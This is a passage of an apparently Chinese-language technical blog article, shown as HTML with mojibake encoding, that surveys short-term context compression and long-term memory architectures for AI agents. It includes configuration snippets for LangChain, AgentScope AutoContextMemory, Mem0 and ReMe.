Â  Â  <span class="hljs-attr">model</span>=<span class="hljs-string">"gpt-4o"</span>,
Â  Â  <span class="hljs-attr">tools</span>=[...],
Â  Â  <span class="hljs-attr">middleware</span>=[
Â  Â  Â  Â  SummarizationMiddleware(
Â  Â  Â  Â  Â  Â  model=<span class="hljs-string">"gpt-4o-mini"</span>,
Â  Â  Â  Â  Â  Â  max_tokens_before_summary=<span class="hljs-number">4000</span>, Â <span class="hljs-comment"># 4000 tokensæ—¶è§¦å‘æ‘˜è¦</span>
Â  Â  Â  Â  Â  Â  messages_to_keep=<span class="hljs-number">20</span>, Â <span class="hljs-comment"># æ‘˜è¦åä¿ç•™æœ€å20æ¡æ¶ˆæ¯</span>
Â  Â  Â  Â  ),
Â  Â  ],
)
</code></pre>
<p><strong>AgentScope</strong></p>
<p>AgentScope é€šè¿‡Â <strong>AutoContextMemory</strong> æä¾›æ™ºèƒ½åŒ–çš„ä¸Šä¸‹æ–‡å·¥ç¨‹è§£å†³æ–¹æ¡ˆã€‚AutoContextMemory å®ç°äº†Â <code>Memory</code> æ¥å£ï¼Œå½“å¯¹è¯å†å²è¶…è¿‡é…ç½®é˜ˆå€¼æ—¶ï¼Œè‡ªåŠ¨åº”ç”¨ 6 ç§æ¸è¿›å¼å‹ç¼©ç­–ç•¥ï¼ˆä»è½»é‡çº§åˆ°é‡é‡çº§ï¼‰æ¥å‡å°‘ä¸Šä¸‹æ–‡å¤§å°ï¼ŒåŒæ—¶ä¿ç•™é‡è¦ä¿¡æ¯ã€‚</p>
<p><strong>é›†æˆæ–¹å¼ï¼š</strong></p>
<ul>
<li>ç›´æ¥ä½œä¸ºÂ <code>Memory</code> æ¥å£å®ç°ï¼Œé€šè¿‡Â <code>memory</code> å‚æ•°é›†æˆåˆ° Agent ä¸­</li>
<li>ä¸æ¡†æ¶æ·±åº¦é›†æˆï¼Œæ— éœ€é¢å¤–çš„ middleware æˆ–ç‹¬ç«‹é…ç½®</li>
</ul>
<p><strong>ä¸ ADK å’Œ LangChain çš„å·®å¼‚ï¼š</strong></p>
<ul>
<li><strong>æ›´ç²¾ç»†åŒ–çš„å‹ç¼©ç­–ç•¥ï¼š</strong> æä¾› 6 ç§æ¸è¿›å¼å‹ç¼©ç­–ç•¥ï¼ˆå‹ç¼©å†å²å·¥å…·è°ƒç”¨ã€å¸è½½å¤§å‹æ¶ˆæ¯ã€æ‘˜è¦å¯¹è¯è½®æ¬¡ç­‰ï¼‰ï¼Œç›¸æ¯” ADK çš„ç®€å•å‹ç¼©å’Œ LangChain çš„æ‘˜è¦ middlewareï¼Œç­–ç•¥æ›´åŠ ç»†åŒ–å’Œå¯æ§</li>
<li><strong>é›†æˆæ–¹å¼ï¼š</strong> ç›´æ¥å®ç° Memory æ¥å£ï¼Œä¸ Agent æ„å»ºæµç¨‹æ— ç¼é›†æˆï¼Œè€Œ ADK å’Œ LangChain éœ€è¦ç‹¬ç«‹çš„é…ç½®å¯¹è±¡æˆ– middleware æœºåˆ¶</li>
<li><strong>å®Œæ•´å¯è¿½æº¯æ€§ï¼š</strong> æä¾›å·¥ä½œå†…å­˜ã€åŸå§‹å†…å­˜ã€å¸è½½ä¸Šä¸‹æ–‡å’Œå‹ç¼©äº‹ä»¶å››å±‚å­˜å‚¨æ¶æ„ï¼Œæ”¯æŒå®Œæ•´å†å²è¿½æº¯ï¼Œè€Œå…¶ä»–æ¡†æ¶é€šå¸¸åªæä¾›å‹ç¼©åçš„ç»“æœ</li>
</ul>
<p><strong>ä½¿ç”¨ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">AutoContextMemoryÂ memoryÂ =Â newÂ <span class="hljs-built_in">AutoContextMemory</span>(
Â  Â  AutoContextConfig.builder()
Â  Â  Â  Â  <span class="hljs-selector-class">.msgThreshold</span>(<span class="hljs-number">100</span>)
Â  Â  Â  Â  <span class="hljs-selector-class">.maxToken</span>(<span class="hljs-number">128</span>Â *Â <span class="hljs-number">1024</span>)
Â  Â  Â  Â  <span class="hljs-selector-class">.tokenRatio</span>(<span class="hljs-number">0.75</span>)
Â  Â  Â  Â  <span class="hljs-selector-class">.build</span>(),
Â  Â  model
);
ReActAgentÂ agentÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("Assistant")
Â  Â  <span class="hljs-selector-class">.model</span>(model)
Â  Â  <span class="hljs-selector-class">.memory</span>(memory)
Â  Â  <span class="hljs-selector-class">.build</span>();
</code></pre>
<p><strong>è¯¦ç»†æ–‡æ¡£ï¼š</strong> å…³äº AutoContextMemory çš„ 6 ç§å‹ç¼©ç­–ç•¥ã€å­˜å‚¨æ¶æ„å’Œé«˜çº§é…ç½®ï¼Œè¯·å‚è€ƒÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzIzOTU0NTQ0MA%3D%3D%26mid%3D2247556750%26idx%3D1%26sn%3D65b82a8da8595494dd6e1adbe605e649%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzIzOTU0NTQ0MA==&amp;mid=2247556750&amp;idx=1&amp;sn=65b82a8da8595494dd6e1adbe605e649&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AutoContextMemory è¯¦ç»†æ–‡æ¡£</a>ã€‚</p>
<h2 data-id="heading-14">é•¿æœŸè®°å¿†æŠ€æœ¯æ¶æ„åŠ Agent æ¡†æ¶é›†æˆ</h2>
<p>ä¸çŸ­æœŸè®°å¿†ä¸åŒï¼Œé•¿æœŸè®°å¿†éœ€è¦è·¨ä¼šè¯æŒä¹…åŒ–å­˜å‚¨ï¼Œå¹¶æ”¯æŒé«˜æ•ˆçš„æ£€ç´¢å’Œæ›´æ–°ã€‚è¿™éœ€è¦ä¸€å¥—å®Œæ•´çš„æŠ€æœ¯æ¶æ„ï¼ŒåŒ…æ‹¬ä¿¡æ¯æå–ã€å‘é‡åŒ–å­˜å‚¨ã€è¯­ä¹‰æ£€ç´¢ç­‰æ ¸å¿ƒç»„ä»¶ã€‚</p>
<h3 data-id="heading-15">4.1 æ ¸å¿ƒç»„ä»¶</h3>
<p>é•¿æœŸè®°å¿†æ¶‰åŠ record &amp; retrieve ä¸¤ä¸ªæ ¸å¿ƒæµç¨‹ï¼Œéœ€è¦ä»¥ä¸‹æ ¸å¿ƒç»„ä»¶ï¼š</p>
<p><strong>1. LLM å¤§æ¨¡å‹ï¼š</strong> æå–çŸ­æœŸè®°å¿†ä¸­çš„æœ‰æ•ˆä¿¡æ¯ï¼ˆè®°å¿†çš„è¯­ä¹‰ç†è§£ã€æŠ½å–ã€å†³ç­–å’Œç”Ÿæˆï¼‰</p>
<p><strong>2. Embedder å‘é‡åŒ–ï¼š</strong> å°†æ–‡æœ¬è½¬æ¢ä¸ºè¯­ä¹‰å‘é‡ï¼Œæ”¯æŒç›¸ä¼¼æ€§è®¡ç®—</p>
<p><strong>3. VectorStore å‘é‡æ•°æ®åº“ï¼š</strong> æŒä¹…åŒ–å­˜å‚¨è®°å¿†å‘é‡å’Œå…ƒæ•°æ®ï¼Œæ”¯æŒé«˜æ•ˆè¯­ä¹‰æ£€ç´¢</p>
<p><strong>4. GraphStore å›¾æ•°æ®åº“ï¼š</strong> å­˜å‚¨å®ä½“-å…³ç³»çŸ¥è¯†å›¾è°±ï¼Œæ”¯æŒå¤æ‚å…³ç³»æ¨ç†</p>
<p><strong>5. Rerankerï¼ˆé‡æ’åºå™¨ï¼‰ï¼š</strong> å¯¹åˆæ­¥æ£€ç´¢ç»“æœæŒ‰è¯­ä¹‰ç›¸å…³æ€§é‡æ–°æ’åº</p>
<p><strong>6. SQLiteï¼š</strong> è®°å½•æ‰€æœ‰è®°å¿†æ“ä½œçš„å®¡è®¡æ—¥å¿—ï¼Œæ”¯æŒç‰ˆæœ¬å›æº¯</p>
<h3 data-id="heading-16">4.2 Record &amp; Retrieve æµç¨‹</h3>
<p>Recordï¼ˆè®°å½•ï¼‰</p>
<pre><code class="hljs">LLMÂ äº‹å®æå– â†’ ä¿¡æ¯å‘é‡åŒ– â†’ å‘é‡å­˜å‚¨ â†’ï¼ˆå¤æ‚å…³ç³»å­˜å‚¨ï¼‰â†’ SQLite æ“ä½œæ—¥å¿—
</code></pre>
<p>Retrieveï¼ˆæ£€ç´¢ï¼‰</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">User</span>Â query å‘é‡åŒ– â†’ å‘é‡æ•°æ®åº“è¯­ä¹‰æ£€ç´¢ â†’ å›¾æ•°æ®åº“å…³ç³»è¡¥å…… â†’ï¼ˆReranker<span class="hljs-operator">-</span>LLMï¼‰â†’ ç»“æœè¿”å›
</code></pre>
<h3 data-id="heading-17">4.3 é•¿æœŸè®°å¿†ä¸ RAG çš„åŒºåˆ«</h3>
<p>åƒ Mem0 è¿™ç±»é¢å‘ AI Agent çš„ä¸ªæ€§åŒ–é•¿æœŸè®°å¿†ç³»ç»Ÿï¼Œä¸ RAGï¼ˆRetrieval-Augmented Generationï¼‰åœ¨æŠ€æœ¯æ¶æ„ä¸Šæœ‰è¯¸å¤šç›¸ä¼¼ä¹‹å¤„ï¼Œä½†åŠŸèƒ½å±‚é¢å’Œåœºæ™¯ä¸Šæœ‰æ˜æ˜¾åŒºåˆ«ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50c50041f1bf4d5f9072d7d0aaf36d30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=D9%2BuaCSddMuXVnZQsT4PO0DVcUY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><strong>æŠ€æœ¯å±‚é¢çš„ç›¸ä¼¼ç‚¹ï¼š</strong></p>
<ol>
<li>
<p>å‘é‡åŒ–å­˜å‚¨ï¼šéƒ½å°†æ–‡æœ¬å†…å®¹é€šè¿‡ Embedding æ¨¡å‹è½¬ä¸ºå‘é‡ï¼Œå­˜å…¥å‘é‡æ•°æ®åº“</p>
</li>
<li>
<p>ç›¸ä¼¼æ€§æ£€ç´¢ï¼šåœ¨ç”¨æˆ·æé—®æ—¶ï¼Œå°†å½“å‰ query å‘é‡åŒ–ï¼Œåœ¨å‘é‡åº“ä¸­æ£€ç´¢ top-k æœ€ç›¸å…³çš„æ¡ç›®</p>
</li>
<li>
<p>æ³¨å…¥ä¸Šä¸‹æ–‡ç”Ÿæˆï¼šå°†æ£€ç´¢åˆ°çš„å†…å®¹æ³¨å…¥åˆ°æ¨¡å‹äº¤äº’ä¸Šä¸‹æ–‡ä¸­ï¼Œè¾…åŠ© LLM ç”Ÿæˆæœ€ç»ˆå›ç­”</p>
</li>
</ol>
<h3 data-id="heading-18">4.4 å…³é”®é—®é¢˜ä¸æŒ‘æˆ˜</h3>
<p>é•¿æœŸè®°å¿†ç³»ç»Ÿåœ¨å®é™…åº”ç”¨ä¸­é¢ä¸´è¯¸å¤šæŒ‘æˆ˜ï¼Œè¿™äº›æŒ‘æˆ˜ç›´æ¥å½±å“ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œç”¨æˆ·ä½“éªŒã€‚</p>
<p><strong>1. å‡†ç¡®æ€§</strong></p>
<p>è®°å¿†çš„å‡†ç¡®æ€§åŒ…å«ä¸¤ä¸ªå±‚é¢ï¼š</p>
<ul>
<li>æœ‰æ•ˆçš„è®°å¿†ç®¡ç†ï¼šéœ€è¦å…·å¤‡æ™ºèƒ½çš„å·©å›ºã€æ›´æ–°å’Œé—å¿˜æœºåˆ¶ï¼Œè¿™ä¸»è¦ä¾èµ–äºè®°å¿†ç³»ç»Ÿä¸­è´Ÿè´£ä¿¡æ¯æå–çš„æ¨¡å‹èƒ½åŠ›å’Œç®—æ³•è®¾è®¡</li>
<li>è®°å¿†ç›¸å…³æ€§çš„æ£€ç´¢å‡†ç¡®åº¦ï¼šä¸»è¦ä¾èµ–äºå‘é‡åŒ–æ£€ç´¢&amp;é‡æ’çš„æ ¸å¿ƒèƒ½åŠ›</li>
</ul>
<p><strong>æ ¸å¿ƒæŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li>è®°å¿†çš„å»ºæ¨¡ï¼šéœ€è¦å®Œå–„å¼ºå¤§çš„ç”¨æˆ·ç”»åƒæ¨¡å‹</li>
<li>è®°å¿†çš„ç®¡ç†ï¼šåŸºäºç”¨æˆ·ç”»åƒå»ºæ¨¡ç®—æ³•ï¼Œæå–æœ‰æ•ˆä¿¡æ¯ï¼Œè®¾è®¡è®°å¿†æ›´æ–°æœºåˆ¶</li>
<li>å‘é‡åŒ–ç›¸å…³æ€§æ£€ç´¢èƒ½åŠ›ï¼šæå‡æ£€ç´¢å‡†ç¡®ç‡å’Œç›¸å…³æ€§</li>
</ul>
<p><strong>2. å®‰å…¨å’Œéšç§</strong></p>
<p>è®°å¿†ç³»ç»Ÿè®°ä½äº†å¤§é‡ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œå¦‚ä½•é˜²æ­¢æ•°æ®ä¸­æ¯’ç­‰æ¶æ„æ”»å‡»ï¼Œå¹¶ä¿éšœç”¨æˆ·éšç§ï¼Œæ˜¯å¿…é¡»è§£å†³çš„é—®é¢˜ã€‚</p>
<p><strong>æ ¸å¿ƒæŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li>æ•°æ®åŠ å¯†ä¸è®¿é—®æ§åˆ¶</li>
<li>é˜²æ­¢æ¶æ„æ•°æ®æ³¨å…¥</li>
<li>é€æ˜çš„æ•°æ®ç®¡ç†æœºåˆ¶</li>
<li>ç”¨æˆ·å¯¹è‡ªèº«æ•°æ®çš„æŒæ§æƒ</li>
</ul>
<p><strong>3. å¤šæ¨¡æ€è®°å¿†æ”¯æŒ</strong></p>
<p>æ–‡æœ¬è®°å¿†ã€è§†è§‰ã€è¯­éŸ³ä»è¢«å­¤ç«‹å¤„ç†ï¼Œå¦‚ä½•æ„å»ºç»Ÿä¸€çš„â€œå¤šæ¨¡æ€è®°å¿†ç©ºé—´â€ä»æ˜¯æœªè§£éš¾é¢˜ã€‚</p>
<p><strong>æ ¸å¿ƒæŒ‘æˆ˜ï¼š</strong></p>
<ul>
<li>è·¨æ¨¡æ€å…³è”ä¸æ£€ç´¢</li>
<li>ç»Ÿä¸€çš„å¤šæ¨¡æ€è®°å¿†è¡¨ç¤º</li>
<li>æ¯«ç§’çº§å“åº”èƒ½åŠ›</li>
</ul>
<h3 data-id="heading-19">4.5 Agent æ¡†æ¶é›†æˆ</h3>
<p>åœ¨ AgentScope ä¸­ï¼Œå¯ä»¥é€šè¿‡é›†æˆç¬¬ä¸‰æ–¹é•¿æœŸè®°å¿†ç»„ä»¶æ¥å®ç°é•¿æœŸè®°å¿†åŠŸèƒ½ã€‚å¸¸è§çš„é›†æˆæ–¹å¼åŒ…æ‹¬ï¼š</p>
<h4 data-id="heading-20">4.5.1 é›†æˆ Mem0</h4>
<p>Mem0 æ˜¯ä¸€ä¸ªå¼€æºçš„é•¿æœŸè®°å¿†æ¡†æ¶ï¼Œå‡ ä¹æˆä¸ºäº‹å®æ ‡å‡†ã€‚åœ¨ AgentScope ä¸­é›†æˆ Mem0 çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// åˆå§‹åŒ–Mem0é•¿æœŸè®°å¿†</span>
Mem0LongTermMemoryÂ mem0MemoryÂ =Â newÂ <span class="hljs-built_in">Mem0LongTermMemory</span>(
Â  Â  Mem0Config.builder()
Â  Â  Â  Â  <span class="hljs-selector-class">.apiKey</span>("your-mem0-api-key")
Â  Â  Â  Â  <span class="hljs-selector-class">.build</span>()
);
<span class="hljs-comment">// åˆ›å»ºAgentå¹¶é›†æˆé•¿æœŸè®°å¿†</span>
ReActAgentÂ agentÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("Assistant")
Â  Â  <span class="hljs-selector-class">.model</span>(model)
Â  Â  <span class="hljs-selector-class">.memory</span>(memory) Â <span class="hljs-comment">// çŸ­æœŸè®°å¿†</span>
Â  Â  <span class="hljs-selector-class">.longTermMemory</span>(mem0Memory) Â <span class="hljs-comment">// é•¿æœŸè®°å¿†</span>
Â  Â  <span class="hljs-selector-class">.build</span>();
</code></pre>
<h4 data-id="heading-21">4.5.2 é›†æˆ ReMe</h4>
<p>ReMe æ˜¯ AgentScope å®˜æ–¹æä¾›çš„é•¿æœŸè®°å¿†å®ç°ï¼Œä¸æ¡†æ¶æ·±åº¦é›†æˆï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// åˆå§‹åŒ–ReMeé•¿æœŸè®°å¿†</span>
ReMeLongTermMemoryÂ remeMemoryÂ =Â ReMeLongTermMemory<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.userId</span>("user123") Â <span class="hljs-comment">// ç”¨æˆ·IDï¼Œç”¨äºè®°å¿†éš”ç¦»</span>
Â  Â  <span class="hljs-selector-class">.apiBaseUrl</span>("http://localhost:<span class="hljs-number">8002</span>") Â <span class="hljs-comment">// ReMeæœåŠ¡åœ°å€</span>
Â  Â  <span class="hljs-selector-class">.build</span>();
<span class="hljs-comment">// åˆ›å»ºAgentå¹¶é›†æˆé•¿æœŸè®°å¿†</span>
ReActAgentÂ agentÂ =Â ReActAgent<span class="hljs-selector-class">.builder</span>()
Â  Â  <span class="hljs-selector-class">.name</span>("Assistant")
Â  Â  <span class="hljs-selector-class">.model</span>(model)
Â  Â  <span class="hljs-selector-class">.memory</span>(memory) Â <span class="hljs-comment">// çŸ­æœŸè®°å¿†</span>
Â  Â  <span class="hljs-selector-class">.longTermMemory</span>(remeMemory) Â <span class="hljs-comment">// é•¿æœŸè®°å¿†</span>
Â  Â  <span class="hljs-selector-class">.longTermMemoryMode</span>(LongTermMemoryMode.BOTH) Â <span class="hljs-comment">// è®°å¿†æ¨¡å¼</span>
Â  Â  <span class="hljs-selector-class">.build</span>();
</code></pre>
<h2 data-id="heading-22">è¡Œä¸šè¶‹åŠ¿ä¸äº§å“å¯¹æ¯”</h2>
<h3 data-id="heading-23">5.1 AI è®°å¿†ç³»ç»Ÿå‘å±•è¶‹åŠ¿</h3>
<p>AI è®°å¿†ç³»ç»Ÿçš„æ ¸å¿ƒç›®æ ‡æ˜¯è®© AI èƒ½åƒäººç±»ä¸€æ ·æŒç»­å­¦ä¹ ã€å½¢æˆé•¿æœŸè®°å¿†ï¼Œä»è€Œå˜å¾—æ›´æ™ºèƒ½ã€æ›´ä¸ªæ€§åŒ–ã€‚å½“å‰è¡Œä¸šå‘ˆç°å‡ºä»ç ”ç©¶åŸå‹å‘ç”Ÿäº§çº§ç³»ç»Ÿæ¼”è¿›ã€ä»å•ä¸€æŠ€æœ¯å‘ç»¼åˆè§£å†³æ–¹æ¡ˆå‘å±•çš„è¶‹åŠ¿ã€‚</p>
<h4 data-id="heading-24">5.1.1 å½“å‰å‘å±•çš„æ ¸å¿ƒè„‰ç»œ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05da7e83795847dd9b366cc99f23ba03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=w0VavWRlmzW6QzoQnOGwzLTYwh8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-25">5.1.2 æŠ€æœ¯å‘å±•è¶‹åŠ¿</h4>
<p><strong>è®°å¿†å³æœåŠ¡ï¼ˆMemory-as-a-Service, MaaSï¼‰</strong></p>
<p>AI Agent æ˜¯å¤§æ¨¡å‹ã€è®°å¿†ã€ä»»åŠ¡è§„åˆ’ä»¥åŠå·¥å…·ä½¿ç”¨çš„é›†åˆä½“ï¼Œè®°å¿†ç®¡ç†å°†æ˜¯ Agent æ™ºèƒ½ä½“çš„æ ¸å¿ƒåŸºç¡€åŠŸèƒ½ä¹‹ä¸€ã€‚ç±»ä¼¼â€œæ•°æ®åº“â€ä¹‹äºä¼ ç»Ÿè½¯ä»¶ï¼Œè®°å¿†ç³»ç»Ÿå°†æˆä¸º AI åº”ç”¨çš„åŸºç¡€è®¾æ–½ï¼Œæä¾›æ ‡å‡†åŒ–çš„è®°å¿†æœåŠ¡æ¥å£ã€å¯æ‰©å±•çš„å­˜å‚¨å’Œæ£€ç´¢èƒ½åŠ›ã€‚</p>
<p><strong>ç²¾ç»†åŒ–è®°å¿†ç®¡ç†</strong></p>
<p>å€Ÿé‰´äººè„‘è®°å¿†æœºåˆ¶ï¼Œæ„å»ºåˆ†å±‚åŠ¨æ€çš„è®°å¿†æ¶æ„ï¼Œå¯¹è®°å¿†è¿›è¡Œå…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚æŠ€æœ¯è·¯å¾„åŒ…æ‹¬ï¼šLLM é©±åŠ¨è®°å¿†æå– + å‘é‡åŒ–å­˜å‚¨ + å›¾æ•°æ®åº“è¡¥å……ï¼›å‘é‡åŒ–æ£€ç´¢ï¼ˆæµ·é©¬ä½“ï¼‰+ LLM æçº¯ï¼ˆå¤§è„‘çš®å±‚ï¼‰ç»“åˆï¼›é€šè¿‡å¼ºåŒ–å­¦ä¹ æå‡è®°å¿†ç®¡ç†è¡¨ç°ã€‚</p>
<p><strong>å¤šæ¨¡æ€è®°å¿†ç³»ç»Ÿ</strong></p>
<p>å¤šæ¨¡æ€å¤§æ¨¡å‹çš„å…´èµ·æ¨åŠ¨è®°å¿†ç³»ç»Ÿå‘å¤šæ¨¡æ€ã€è·¨æ¨¡æ€æ–¹å‘å‘å±•ï¼Œè¦æ±‚å­˜å‚¨å…·å¤‡è·¨æ¨¡æ€å…³è”ä¸æ¯«ç§’çº§å“åº”èƒ½åŠ›ã€‚</p>
<p><strong>å‚æ•°åŒ–è®°å¿†ï¼ˆModel å±‚é›†æˆè®°å¿†ï¼‰</strong></p>
<p>åœ¨ Transformer æ¶æ„ä¸­å¼•å…¥å¯å­¦ä¹ çš„è®°å¿†å•å…ƒ Memory Adapterï¼Œå®ç°æ¨¡å‹å±‚é¢åŸç”Ÿæ”¯æŒç”¨æˆ·ç»´åº¦çš„è®°å¿†ã€‚ä¼˜ç‚¹æ˜¯å“åº”é€Ÿåº¦å¿«ï¼Œä½†é¢ä¸´â€œç¾éš¾æ€§é—å¿˜â€å’Œæ›´æ–°æˆæœ¬é«˜çš„æŒ‘æˆ˜ã€‚</p>
<h4 data-id="heading-26">5.1.3 å½“å‰ä¸»è¦çš„æŠ€æœ¯è·¯å¾„</h4>
<p><strong>1. å¤–éƒ¨è®°å¿†å¢å¼ºï¼ˆå½“å‰ä¸»æµï¼‰ï¼š</strong> ä½¿ç”¨å‘é‡æ•°æ®åº“ç­‰å¤–éƒ¨å­˜å‚¨æ¥è®°å¿†å†å²ä¿¡æ¯ï¼Œå¹¶åœ¨éœ€è¦æ—¶é€šè¿‡æ£€ç´¢ç›¸å…³ä¿¡æ¯æ³¨å…¥å½“å‰å¯¹è¯ã€‚è¿™ç§æ–¹å¼çµæ´»é«˜æ•ˆï¼Œæ£€ç´¢çš„å‡†ç¡®æ€§æ˜¯å…³é”®ã€‚</p>
<p><strong>2. å‚æ•°åŒ–è®°å¿†ï¼ˆæ·±åº¦å†…åŒ–ï¼‰ï¼š</strong> ç›´æ¥å°†çŸ¥è¯†ç¼–ç è¿›æ¨¡å‹çš„å‚æ•°ä¸­ã€‚è¿™å¯ä»¥é€šè¿‡æ¨¡å‹å¾®è°ƒã€çŸ¥è¯†ç¼–è¾‘ç­‰æŠ€æœ¯å®ç°ï¼Œä¼˜ç‚¹æ˜¯å“åº”é€Ÿåº¦å¿«ï¼Œä½†é¢ä¸´â€œç¾éš¾æ€§é—å¿˜â€å’Œæ›´æ–°æˆæœ¬é«˜çš„æŒ‘æˆ˜ã€‚</p>
<h3 data-id="heading-27">5.2 ç›¸å…³å¼€æºäº§å“å¯¹æ¯”</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3b42e7e65944c2aa15be84b24f1e9aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604866&amp;x-signature=Hq1NtS1kIYSzQ0IvlvZXb8yAWyI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å…³äºå„äº§å“çš„å…·ä½“æ•°æ®æŒ‡æ ‡å¯¹æ¯”ï¼Œè¯„æµ‹æ–¹å¼å„æœ‰ä¾§é‡ï¼Œå› æ­¤è¯„æµ‹ç»“æœä¸å°½ç›¸åŒï¼Œä»å®é™…æƒ…å†µçœ‹ï¼Œå„æ–¹å‡ä»¥ mem0 ä¸ºè¯„æµ‹åŸºå‡†ï¼Œä»å„ç±»æŠ€æœ¯æŒ‡æ ‡è¯„æµ‹ç»“æœä»¥åŠå¼€æºç¤¾åŒºçš„æ´»è·ƒåº¦ï¼ˆstarï¼Œissues ç­‰ï¼‰æ–¹é¢ï¼Œmem0 ä»ç„¶æ˜¯å æ®é•¿æœŸè®°å¿†äº§å“çš„é¢†å¤´åœ°ä½ã€‚</p>
<h2 data-id="heading-28">ç»“è¯­</h2>
<p>è®°å¿†ç³»ç»Ÿä½œä¸º AI Agent çš„æ ¸å¿ƒåŸºç¡€è®¾æ–½ï¼Œå…¶å‘å±•ç›´æ¥å½±å“ç€æ™ºèƒ½ä½“çš„èƒ½åŠ›å’Œç”¨æˆ·ä½“éªŒã€‚ç°åœ¨å„æ¡†æ¶å†…ç½®çš„å‹ç¼©ã€å¸è½½ã€æ‘˜è¦ç­‰ç­–ç•¥ï¼Œå·²ç»èƒ½è§£å†³ 80-90% çš„é€šç”¨åœºæ™¯é—®é¢˜ï¼Œä½†å¯¹äºç‰¹å®šè¡Œä¸šæˆ–åœºæ™¯ï¼Œæ¯”å¦‚åŒ»ç–—ã€æ³•å¾‹ã€é‡‘èç­‰é¢†åŸŸï¼ŒåŸºäºé€šç”¨çš„ä¸Šä¸‹æ–‡å¤„ç†ç­–ç•¥åŸºç¡€ä¹‹ä¸Šè¿›è¡Œé’ˆå¯¹æ€§çš„å¤„ç†å’Œæ›´ç²¾ç»†çš„å‹ç¼© prompt è®¾è®¡ï¼Œä»ç„¶æœ‰è¾ƒå¤§çš„ä¼˜åŒ–ç©ºé—´ã€‚è€Œé•¿æœŸè®°å¿†ä½œä¸ºå¯ç‹¬ç«‹æ¼”è¿›çš„ç»„ä»¶ï¼Œæœªæ¥ä¼šæ›´åŠ è´´è¿‘äººè„‘çš„è®°å¿†æ¼”åŒ–æ¨¡å¼ï¼ŒåŒ…æ‹¬è®°å¿†çš„å·©å›ºã€å¼ºåŒ–ã€é—å¿˜ç­‰å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼ŒåŒæ—¶é•¿æœŸè®°å¿†åº”è¯¥ä»¥äº‘æœåŠ¡æ¨¡å¼æä¾›é€šç”¨çš„è®°å¿†æœåŠ¡ï¼Œå…±åŒåŠ©åŠ› Agent è¿ˆå‘æ›´é«˜é˜¶çš„æ™ºèƒ½ã€‚</p>
<p><strong>ç›¸å…³é˜…è¯»ï¼š</strong></p>
<p>ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580979%26idx%3D1%26sn%3Db55ba91471d7bda26b70d7ef32b9144a%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580979&amp;idx=1&amp;sn=b55ba91471d7bda26b70d7ef32b9144a&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AgentScope Java ç­”ç–‘æ—¶é—´ï¼šå¼€å‘è€…è¿‘æœŸæœ€å…³å¿ƒçš„ 12 ä¸ªé—®é¢˜</a>ã€‹</p>
<p>ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUzNzYxNjAzMg%3D%3D%26mid%3D2247580755%26idx%3D1%26sn%3D870d3de4e1a8e36796532cd18d8ab6e7%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUzNzYxNjAzMg==&amp;mid=2247580755&amp;idx=1&amp;sn=870d3de4e1a8e36796532cd18d8ab6e7&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">AgentScope x RocketMQï¼šæ‰“é€ ä¼ä¸šçº§é«˜å¯é  A2A æ™ºèƒ½ä½“é€šä¿¡åŸºåº§</a>ã€‹</p>
